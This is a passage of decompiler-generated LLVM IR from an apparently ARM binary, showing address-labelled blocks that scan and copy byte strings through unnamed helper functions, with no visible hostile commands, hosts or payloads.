  %v2_9858 = add i32 %v0_9858, %v0_9d34
  %v3_9858 = inttoptr i32 %v2_9858 to i8*
  %v4_9858 = load i8, i8* %v3_9858, align 1
  %v6_9858 = zext i8 %v4_9858 to i32
  store i32 %v6_9858, i32* %r3.global-to-local, align 4
  %v2_985c = icmp ugt i8 %v4_9858, 33
  store i1 %v2_985c, i1* %cpsr_c.global-to-local, align 1
  %v7_985c = icmp eq i8 %v4_9858, 34
  store i1 %v7_985c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_985c, label %dec_label_pc_9d34, label %dec_label_pc_9864

dec_label_pc_9864:                                ; preds = %dec_label_pc_9d34, %dec_label_pc_9858, %dec_label_pc_9d5c
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_986c = inttoptr i32 %v0_9864 to i8*
  %v3_986c = call i32 @function_125a4(i8* %v2_986c, i32 10)
  store i32 %v3_986c, i32* %r0.global-to-local, align 4
  %v1_9870 = add i32 %v3_986c, -1
  store i32 %v1_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = icmp ugt i32 %v1_9870, 7
  store i1 %v2_9874, i1* %cpsr_c.global-to-local, align 1
  %v7_9874 = icmp eq i32 %v1_9870, 8
  store i1 %v7_9874, i1* %cpsr_z.global-to-local, align 1
  %v2_9878 = xor i1 %v2_9874, true
  %v3_9878 = or i1 %v7_9874, %v2_9878
  br i1 %v3_9878, label %dec_label_pc_988c.preheader, label %dec_label_pc_98a0

dec_label_pc_988c.preheader:                      ; preds = %dec_label_pc_9864
  store i32 %v2_875c, i32* %r2.global-to-local, align 4
  %v6_987c = add i32 %v3_986c, %v2_875c
  store i32 %v6_987c, i32* @r4, align 4
  br label %dec_label_pc_988c

dec_label_pc_9888:                                ; preds = %dec_label_pc_988c
  %v1_9888 = call i32 @function_1524c(i32 1)
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_988c

dec_label_pc_988c:                                ; preds = %dec_label_pc_988c.preheader, %dec_label_pc_9888
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_12d98(i32* null)
  %v0_9894 = load i32, i32* @r4, align 4
  %v3_9894 = icmp uge i32 %v0_9894, %v2_9890
  store i1 %v3_9894, i1* %cpsr_c.global-to-local, align 1
  %v9_9894 = icmp eq i32 %v0_9894, %v2_9890
  store i1 %v9_9894, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_989c = xor i1 %v9_9894, true
  %v3_989c = and i1 %v3_9894, %v2_989c
  br i1 %v3_989c, label %dec_label_pc_9888, label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_988c, %dec_label_pc_9864
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_98a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98a4, i32* @r4, align 4
  %v0_98a8 = load i32, i32* @r5, align 4
  %v2_98a8 = add i32 %v0_98a8, %v3_98a4
  store i32 %v2_98a8, i32* @r6, align 4
  store i32 %v2_98a8, i32* %r0.global-to-local, align 4
  %v1_98b0 = inttoptr i32 %v2_98a8 to i8*
  %v2_98b0 = call i32 @function_12480(i8* %v1_98b0)
  store i32 ptrtoint ([5 x i8]* @global_var_18530.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98b0, i32* @r1, align 4
  %v0_98bc = load i32, i32* @r6, align 4
  store i32 %v0_98bc, i32* %r0.global-to-local, align 4
  %v4_98c0 = inttoptr i32 %v0_98bc to i8*
  %v5_98c0 = call i32 @function_127d0(i8* %v4_98c0, i32 %v2_98b0, i32 ptrtoint ([5 x i8]* @global_var_18530.40 to i32))
  store i32 %v5_98c0, i32* %r0.global-to-local, align 4
  %v2_98c4 = icmp ugt i32 %v5_98c0, 3
  store i1 %v2_98c4, i1* %cpsr_c.global-to-local, align 1
  %v7_98c4 = icmp eq i32 %v5_98c0, 4
  store i1 %v7_98c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98c4, label %dec_label_pc_9c20, label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98a0
  %v0_98cc = load i32, i32* @r5, align 4
  %v1_98cc = load i32, i32* @r4, align 4
  %v2_98cc = add i32 %v1_98cc, %v0_98cc
  %v3_98cc = inttoptr i32 %v2_98cc to i8*
  %v4_98cc = load i8, i8* %v3_98cc, align 1
  %v6_98cc = zext i8 %v4_98cc to i32
  store i32 %v6_98cc, i32* @r3, align 4
  %v2_98d0 = icmp ugt i8 %v4_98cc, 46
  store i1 %v2_98d0, i1* %cpsr_c.global-to-local, align 1
  %v7_98d0 = icmp eq i8 %v4_98cc, 47
  store i1 %v7_98d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98d0, label %dec_label_pc_9d7c, label %dec_label_pc_98d8

dec_label_pc_98d8:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9d7c, %dec_label_pc_9ce4, %dec_label_pc_9cc8, %dec_label_pc_98cc, %dec_label_pc_9dc4, %dec_label_pc_9d10
  %v0_98d8 = load i32, i32* %sb.global-to-local, align 4
  %v1_98dc = add i32 %v0_98d8, 1431
  store i32 %v1_98dc, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_98e8 = call i32 @function_13680()
  store i32 %v0_98e8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_98f0 = load i32, i32* @sl, align 4
  %v3_98f0 = add i32 %v2_98f0, -1448
  %v4_98f0 = inttoptr i32 %v3_98f0 to i8*
  store i8 10, i8* %v4_98f0, align 1
  br label %dec_label_pc_87ac

dec_label_pc_98f8:                                ; preds = %dec_label_pc_97c4, %dec_label_pc_9704, %dec_label_pc_96d8
  %v0_98f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98f8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v5_9908 = call i32 @function_12538(i32 %v2_823c, i32 %v0_98f8, i32 ptrtoint ([5 x i8]* @global_var_18524.38 to i32), i32 4)
  %v0_990c = load i32, i32* %sb.global-to-local, align 4
  %v1_9910 = add i32 %v0_990c, 1431
  store i32 %v1_9910, i32* @r4, align 4
  store i32 %v5_9908, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_18540.44 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9910, i32* %r0.global-to-local, align 4
  %v3_9920 = inttoptr i32 %v1_9910 to i8*
  %v4_9920 = call i32 @function_12860(i8* %v3_9920, i32 ptrtoint ([5 x i8]* @global_var_18540.44 to i32))
  store i32 %v4_9920, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9924 = icmp eq i32 %v4_9920, 0
  store i1 %v2_9924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9924, label %dec_label_pc_9ad4, label %dec_label_pc_992c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_98f8
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 7, i8* %v4_9930, align 1
  br label %dec_label_pc_9934

dec_label_pc_9934:                                ; preds = %bb211, %dec_label_pc_992c
  %v0_9934 = load i32, i32* @r5, align 4
  store i32 %v0_9934, i32* %r2.global-to-local, align 4
  %v0_9938 = load i32, i32* @sl, align 4
  %v1_9938 = add i32 %v0_9938, -1452
  %v2_9938 = inttoptr i32 %v1_9938 to i32*
  %v3_9938 = load i32, i32* %v2_9938, align 4
  store i32 %v3_9938, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9944 = call i32 @function_13810(i32 %v3_9938, i32 %v2_823c, i32 %v0_9934, i32 16384)
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ac

dec_label_pc_994c:                                ; preds = %dec_label_pc_8e54
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9954 = load i32, i32* @sl, align 4
  %v1_9954 = add i32 %v0_9954, 660
  %v2_9954 = inttoptr i32 %v1_9954 to i32*
  %v3_9954 = load i32, i32* %v2_9954, align 4
  store i32 %v3_9954, i32* @r4, align 4
  %v3_9958 = call i32 @function_11b24(i32 36, i32* null)
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r1.global-to-local, align 4
  store i32 %v3_9958, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9968 = load i32, i32* @r7, align 4
  store i32 %v0_9968, i32* %r0.global-to-local, align 4
  %v4_996c = call i32 @function_12538(i32 %v0_9968, i32 %v0_995c, i32 %v3_9958, i32 11)
  store i32 %v4_996c, i32* %r0.global-to-local, align 4
  %v0_9970 = load i32, i32* @sl, align 4
  %v1_9970 = add i32 %v0_9970, 660
  %v2_9970 = inttoptr i32 %v1_9970 to i32*
  %v3_9970 = load i32, i32* %v2_9970, align 4
  %v0_9974 = load i32, i32* @r7, align 4
  %v2_9974 = add i32 %v0_9974, %v4_996c
  store i32 %v2_9974, i32* @r6, align 4
  store i32 %v4_996c, i32* @r4, align 4
  %v2_997c = sub i32 %v3_9970, %v4_996c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18548.46 to i32), i32* %r2.global-to-local, align 4
  %v0_9984 = load i32, i32* @r8, align 4
  store i32 %v0_9984, i32* %r3.global-to-local, align 4
  store i32 %v2_9974, i32* %r0.global-to-local, align 4
  %v4_998c = call i32 @function_12538(i32 %v2_9974, i32 %v2_997c, i32 ptrtoint (i32* @global_var_18548.46 to i32), i32 %v0_9984)
  store i32 %v4_998c, i32* %r0.global-to-local, align 4
  %v0_9990 = load i32, i32* @sl, align 4
  %v1_9990 = add i32 %v0_9990, 16
  %v2_9990 = inttoptr i32 %v1_9990 to i32*
  %v3_9990 = load i32, i32* %v2_9990, align 4
  store i32 %v3_9990, i32* %r3.global-to-local, align 4
  %v1_9994 = load i32, i32* @r4, align 4
  %v2_9994 = add i32 %v1_9994, %v4_998c
  store i32 %v2_9994, i32* @r5, align 4
  %v0_9998 = load i32, i32* %sb.global-to-local, align 4
  %v2_9998 = add i32 %v0_9998, %v2_9994
  store i32 %v2_9998, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99a0 = icmp ugt i32 %v3_9990, 3
  store i1 %v2_99a0, i1* %cpsr_c.global-to-local, align 1
  %v7_99a0 = icmp eq i32 %v3_9990, 4
  store i1 %v7_99a0, i1* %cpsr_z.global-to-local, align 1
  %v3_99a4 = add i32 %v2_9998, 2115
  %v4_99a4 = inttoptr i32 %v3_99a4 to i8*
  store i8 0, i8* %v4_99a4, align 1
  %v7_99a8 = icmp sgt i32 %v3_9990, 4
  br i1 %v7_99a8, label %dec_label_pc_99ac, label %dec_label_pc_9b14

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_9b14, %dec_label_pc_9b24
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99b4 = load i32, i32* @sl, align 4
  %v2_99b4 = add i32 %v1_99b4, 12
  %v3_99b4 = inttoptr i32 %v2_99b4 to i32*
  store i32 -1, i32* %v3_99b4, align 4
  %v0_99b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99b8 = trunc i32 %v0_99b8 to i8
  %v2_99b8 = load i32, i32* @sl, align 4
  %v3_99b8 = add i32 %v2_99b8, -1448
  %v4_99b8 = inttoptr i32 %v3_99b8 to i8*
  store i8 %v1_99b8, i8* %v4_99b8, align 1
  br label %dec_label_pc_87ac

dec_label_pc_99c0:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_99cc = load i32, i32* @r6, align 4
  %v1_99cc = add i32 %v0_99cc, 4
  %v2_99cc = inttoptr i32 %v1_99cc to i8*
  %v3_99cc = load i8, i8* %v2_99cc, align 1
  %v4_99cc = zext i8 %v3_99cc to i32
  store i32 %v4_99cc, i32* @r3, align 4
  %v2_99d0 = icmp ugt i8 %v3_99cc, 114
  store i1 %v2_99d0, i1* %cpsr_c.global-to-local, align 1
  %v7_99d0 = icmp eq i8 %v3_99cc, 115
  store i1 %v7_99d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99d0, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_99c0
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_99c0, %bb206
  %v3_99e0 = phi i32 [ 7, %dec_label_pc_99c0 ], [ 8, %bb206 ]
  store i32 %v0_99cc, i32* @r0, align 4
  %v1_99e8 = load i32, i32* @r5, align 4
  %v2_99e8 = sub i32 %v1_99e8, %v3_99e0
  store i32 %v2_99e8, i32* @r2, align 4
  %v2_99ec = add i32 %v3_99e0, %v0_99cc
  store i32 %v2_99ec, i32* @r1, align 4
  %v3_99f0 = call i32 @function_13670(i32 %v0_99cc, i32 %v2_99ec, i32 %v2_99e8)
  store i32 %v3_99f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v0_99f8 = load i32, i32* @r7, align 4
  store i32 %v0_99f8, i32* %stack_var_-44, align 4
  store i32 %v2_823c, i32* @lr, align 4
  %v1_9a00 = load i32, i32* @r4, align 4
  %v2_9a00 = add i32 %v1_9a00, %v2_823c
  %v3_9a00 = inttoptr i32 %v2_9a00 to i8*
  %v4_9a00 = load i8, i8* %v3_9a00, align 1
  %v6_9a00 = zext i8 %v4_9a00 to i32
  store i32 %v6_9a00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a04 = icmp eq i8 %v4_9a00, 0
  store i1 %v2_9a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a04, label %dec_label_pc_9a48, label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %.thread41
  %v2_9a0c = icmp ugt i8 %v4_9a00, 46
  store i1 %v2_9a0c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a0c = icmp eq i8 %v4_9a00, 47
  store i1 %v7_9a0c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a10 = load i32, i32* @r6, align 4
  br i1 %v7_9a0c, label %bb207, label %dec_label_pc_9a18

bb207:                                            ; preds = %dec_label_pc_9a0c
  store i32 %v1_9a10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b08

dec_label_pc_9a18:                                ; preds = %dec_label_pc_9a0c
  store i32 %v0_99f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a28

dec_label_pc_9a20:                                ; preds = %dec_label_pc_9a28
  %v2_9a20 = icmp ugt i8 %v4_9a34, 46
  store i1 %v2_9a20, i1* %cpsr_c.global-to-local, align 1
  %v7_9a20 = icmp eq i8 %v4_9a34, 47
  store i1 %v7_9a20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a20, label %dec_label_pc_9b08, label %dec_label_pc_9a28

dec_label_pc_9a28:                                ; preds = %dec_label_pc_9a20, %dec_label_pc_9a18
  %v0_9a28 = phi i32 [ %v1_9a28, %dec_label_pc_9a20 ], [ %v0_99f8, %dec_label_pc_9a18 ]
  %v1_9a28 = add i32 %v0_9a28, 1
  store i32 %v1_9a28, i32* %ip.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v1_9a28, i32* %stack_var_-44, align 4
  %v2_9a34 = add i32 %v1_9a28, %v1_9a10
  %v3_9a34 = inttoptr i32 %v2_9a34 to i8*
  %v4_9a34 = load i8, i8* %v3_9a34, align 1
  %v6_9a34 = zext i8 %v4_9a34 to i32
  store i32 %v6_9a34, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a38 = icmp eq i8 %v4_9a34, 0
  store i1 %v2_9a38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a28, i32* %r1.global-to-local, align 4
  store i32 %v2_9a34, i32* %r2.global-to-local, align 4
  br i1 %v2_9a38, label %dec_label_pc_9a48, label %dec_label_pc_9a20

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a28, %.thread41, %dec_label_pc_9b08
  %v0_9a48 = load i32, i32* @r6, align 4
  store i32 %v0_9a48, i32* %r0.global-to-local, align 4
  %v1_9a4c = inttoptr i32 %v0_9a48 to i8*
  %v2_9a4c = call i32 @function_12480(i8* %v1_9a4c)
  store i32 %v2_9a4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a50 = icmp eq i32 %v2_9a4c, 0
  store i1 %v2_9a50, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_9a4c, 1
  br i1 %tmp208, label %dec_label_pc_9a74, label %dec_label_pc_9a58

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a48
  %v0_9a58 = load i32, i32* @r6, align 4
  store i32 %v0_9a58, i32* %r0.global-to-local, align 4
  %v1_9a5c = inttoptr i32 %v0_9a58 to i8*
  %v2_9a5c = call i32 @function_12480(i8* %v1_9a5c)
  store i32 %v2_9a5c, i32* %r0.global-to-local, align 4
  %v1_9a60 = add i32 %v2_9a5c, -127
  %v2_9a60 = icmp ugt i32 %v2_9a5c, 126
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v3_9a60 = sub i32 126, %v2_9a5c
  %v4_9a60 = and i32 %v3_9a60, %v2_9a5c
  %v5_9a60 = icmp slt i32 %v4_9a60, 0
  %v6_9a60 = icmp slt i32 %v1_9a60, 0
  %v7_9a60 = icmp eq i32 %v2_9a5c, 127
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  %v7_9a64 = icmp sgt i32 %v2_9a5c, 127
  br i1 %v7_9a64, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_9a58
  %v8_9a64 = load i32, i32* %sb.global-to-local, align 4
  %v9_9a68 = add i32 %v8_9a64, 789
  store i32 %v9_9a68, i32* %r0.global-to-local, align 4
  %v8_9a6c = load i32, i32* @r6, align 4
  store i32 %v8_9a6c, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9a58, %bb209
  store i32 39540, i32* @lr, align 4
  %v3_9a70 = xor i1 %v6_9a60, %v5_9a60
  %v4_9a70 = or i1 %v7_9a60, %v3_9a70
  call void @__pseudo_cond_branch(i1 %v4_9a70, i32 ptrtoint (i32* @global_var_124a8.47 to i32))
  br label %dec_label_pc_9a74

dec_label_pc_9a74:                                ; preds = %dec_label_pc_9a48, %.thread44
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9a78 = load i32, i32* %stack_var_-44, align 4
  %v0_9a7c = load i32, i32* @r6, align 4
  %v1_9a7c = add i32 %v0_9a7c, 1
  store i32 %v1_9a7c, i32* @r5, align 4
  %v2_9a80 = add i32 %v1_9a7c, %v3_9a78
  store i32 %v2_9a80, i32* %r0.global-to-local, align 4
  %v1_9a84 = inttoptr i32 %v2_9a80 to i8*
  %v2_9a84 = call i32 @function_12480(i8* %v1_9a84)
  store i32 %v2_9a84, i32* %r0.global-to-local, align 4
  %v2_9a88 = icmp ugt i32 %v2_9a84, 254
  store i1 %v2_9a88, i1* %cpsr_c.global-to-local, align 1
  %v7_9a88 = icmp eq i32 %v2_9a84, 255
  store i1 %v7_9a88, i1* %cpsr_z.global-to-local, align 1
  %v8_9a8c = icmp sgt i32 %v2_9a84, 255
  br i1 %v8_9a8c, label %dec_label_pc_9614, label %dec_label_pc_9a90

dec_label_pc_9a90:                                ; preds = %dec_label_pc_9a74
  %v0_9a90 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a94 = add i32 %v0_9a90, 533
  store i32 %v1_9a94, i32* @r4, align 4
  store i32 %v1_9a94, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9aa0 = call i32 @function_12514(i32 %v1_9a94, i32 255)
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v3_9aa8 = load i32, i32* %stack_var_-44, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  %v2_9aac = add i32 %v0_9aac, %v3_9aa8
  store i32 %v2_9aac, i32* %r0.global-to-local, align 4
  %v1_9ab0 = inttoptr i32 %v2_9aac to i8*
  %v2_9ab0 = call i32 @function_12480(i8* %v1_9ab0)
  store i32 %v2_9ab0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ab4 = icmp eq i32 %v2_9ab0, 0
  store i1 %v2_9ab4, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_9ab0, 1
  br i1 %tmp210, label %dec_label_pc_9614, label %dec_label_pc_9abc

dec_label_pc_9abc:                                ; preds = %dec_label_pc_9a90
  %v3_9ac0 = load i32, i32* %stack_var_-44, align 4
  %v0_9ac4 = load i32, i32* @r4, align 4
  store i32 %v0_9ac4, i32* @r0, align 4
  %v0_9ac8 = load i32, i32* @r5, align 4
  %v2_9ac8 = add i32 %v0_9ac8, %v3_9ac0
  store i32 %v2_9ac8, i32* %r1.global-to-local, align 4
  %v2_9acc = inttoptr i32 %v0_9ac4 to i8*
  %v3_9acc = call i32 @function_124a8(i8* %v2_9acc, i32 %v2_9ac8)
  store i32 %v3_9acc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9614

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_98f8
  %v0_9ad4 = load i32, i32* @r4, align 4
  store i32 %v0_9ad4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32), i32* %r1.global-to-local, align 4
  %v3_9adc = inttoptr i32 %v0_9ad4 to i8*
  %v4_9adc = call i32 @function_12860(i8* %v3_9adc, i32 ptrtoint ([4 x i8]* @global_var_1850c.17 to i32))
  store i32 %v4_9adc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ae0 = icmp eq i32 %v4_9adc, 0
  store i1 %v2_9ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ae0, label %bb211, label %dec_label_pc_992c

bb211:                                            ; preds = %dec_label_pc_9ad4
  %v0_9ae8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9ae8 = load i32, i32* @r5, align 4
  %v3_9ae8 = icmp uge i32 %v0_9ae8, %v1_9ae8
  store i1 %v3_9ae8, i1* %cpsr_c.global-to-local, align 1
  %v9_9ae8 = icmp eq i32 %v0_9ae8, %v1_9ae8
  store i1 %v9_9ae8, i1* %cpsr_z.global-to-local, align 1
  %v7_9aec = icmp sgt i32 %v0_9ae8, %v1_9ae8
  %. = select i1 %v7_9aec, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9af4 = trunc i32 %. to i8
  %v10_9af4 = load i32, i32* @sl, align 4
  %v11_9af4 = add i32 %v10_9af4, -1448
  %v12_9af4 = inttoptr i32 %v11_9af4 to i8*
  store i8 %v9_9af4, i8* %v12_9af4, align 1
  br label %dec_label_pc_9934

dec_label_pc_9b00:                                ; preds = %dec_label_pc_8ef8
  %v0_9b00 = load i32, i32* @r4, align 4
  %v1_9b00 = trunc i32 %v0_9b00 to i8
  %v2_9b00 = load i32, i32* @sl, align 4
  %v3_9b00 = add i32 %v2_9b00, -1448
  %v4_9b00 = inttoptr i32 %v3_9b00 to i8*
  store i8 %v1_9b00, i8* %v4_9b00, align 1
  br label %dec_label_pc_87ac

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9a20, %bb207
  %v2_9b0c = phi i32 [ %v1_9a10, %bb207 ], [ %v2_9a34, %dec_label_pc_9a20 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b0c = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b0c, align 1
  br label %dec_label_pc_9a48

dec_label_pc_9b14:                                ; preds = %dec_label_pc_994c
  %v0_9b14 = load i32, i32* @r6, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  %v1_9b18 = inttoptr i32 %v0_9b14 to i8*
  %v2_9b18 = call i32 @function_12480(i8* %v1_9b18)
  store i32 %v2_9b18, i32* %r0.global-to-local, align 4
  %v2_9b1c = icmp ugt i32 %v2_9b18, 126
  store i1 %v2_9b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b1c = icmp eq i32 %v2_9b18, 127
  store i1 %v7_9b1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b20 = icmp sgt i32 %v2_9b18, 127
  br i1 %v8_9b20, label %dec_label_pc_99ac, label %dec_label_pc_9b24

dec_label_pc_9b24:                                ; preds = %dec_label_pc_9b14
  %v0_9b24 = load i32, i32* @sl, align 4
  %v1_9b24 = add i32 %v0_9b24, 16
  %v2_9b24 = inttoptr i32 %v1_9b24 to i32*
  %v3_9b24 = load i32, i32* %v2_9b24, align 4
  %v1_9b28 = and i32 %v3_9b24, 33554432
  %v2_9b28 = icmp ne i32 %v1_9b28, 0
  store i1 %v2_9b28, i1* %cpsr_c.global-to-local, align 1
  %v3_9b28 = mul i32 %v3_9b24, 128
  %v1_9b2c = add i32 %v3_9b28, 1472
  %v0_9b30 = load i32, i32* @r6, align 4
  store i32 %v0_9b30, i32* %r1.global-to-local, align 4
  %v0_9b34 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b34 = add i32 %v1_9b2c, %v0_9b34
  store i32 %v2_9b34, i32* @r0, align 4
  %v2_9b38 = inttoptr i32 %v2_9b34 to i8*
  %v3_9b38 = call i32 @function_124a8(i8* %v2_9b38, i32 %v0_9b30)
  store i32 %v3_9b38, i32* %r0.global-to-local, align 4
  %v0_9b3c = load i32, i32* @sl, align 4
  %v1_9b3c = add i32 %v0_9b3c, 16
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  %v1_9b40 = and i32 %v3_9b3c, 33554432
  %v2_9b40 = icmp ne i32 %v1_9b40, 0
  store i1 %v2_9b40, i1* %cpsr_c.global-to-local, align 1
  %v3_9b40 = mul i32 %v3_9b3c, 128
  %v1_9b44 = add i32 %v3_9b40, 1472
  %v0_9b48 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b48 = add i32 %v1_9b44, %v0_9b48
  store i32 %v2_9b48, i32* @r4, align 4
  store i32 %v2_9b48, i32* %r0.global-to-local, align 4
  %v1_9b50 = inttoptr i32 %v2_9b48 to i8*
  %v2_9b50 = call i32 @function_12480(i8* %v1_9b50)
  store i32 ptrtoint (i32* @global_var_1854c.49 to i32), i32* %r1.global-to-local, align 4
  %v0_9b58 = load i32, i32* @r4, align 4
  %v2_9b58 = add i32 %v0_9b58, %v2_9b50
  store i32 %v2_9b58, i32* @r0, align 4
  %v2_9b5c = inttoptr i32 %v2_9b58 to i8*
  %v3_9b5c = call i32 @function_124a8(i8* %v2_9b5c, i32 ptrtoint (i32* @global_var_1854c.49 to i32))
  store i32 %v3_9b5c, i32* %r0.global-to-local, align 4
  %v0_9b60 = load i32, i32* @r5, align 4
  %v1_9b60 = add i32 %v0_9b60, 3
  store i32 %v1_9b60, i32* @r5, align 4
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 660
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v0_9b68 = load i32, i32* @r7, align 4
  %v2_9b68 = add i32 %v0_9b68, %v1_9b60
  store i32 %v2_9b68, i32* @r6, align 4
  %v2_9b6c = sub i32 %v3_9b64, %v1_9b60
  store i32 %v2_9b6c, i32* %r1.global-to-local, align 4
  %v0_9b70 = load i32, i32* @r8, align 4
  store i32 %v0_9b70, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_18548.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9b68, i32* %r0.global-to-local, align 4
  %v4_9b7c = call i32 @function_12538(i32 %v2_9b68, i32 %v2_9b6c, i32 ptrtoint (i32* @global_var_18548.46 to i32), i32 %v0_9b70)
  store i32 %v4_9b7c, i32* %r0.global-to-local, align 4
  %v0_9b80 = load i32, i32* @sl, align 4
  %v1_9b80 = add i32 %v0_9b80, 16
  %v2_9b80 = inttoptr i32 %v1_9b80 to i32*
  %v3_9b80 = load i32, i32* %v2_9b80, align 4
  %v1_9b84 = and i32 %v3_9b80, 33554432
  %v2_9b84 = icmp ne i32 %v1_9b84, 0
  store i1 %v2_9b84, i1* %cpsr_c.global-to-local, align 1
  %v3_9b84 = mul i32 %v3_9b80, 128
  %v1_9b88 = add i32 %v3_9b84, 1472
  %v0_9b8c = load i32, i32* %sb.global-to-local, align 4
  %v1_9b8c = load i32, i32* @r5, align 4
  %v2_9b90 = add i32 %v1_9b88, %v0_9b8c
  store i32 %v2_9b90, i32* @r4, align 4
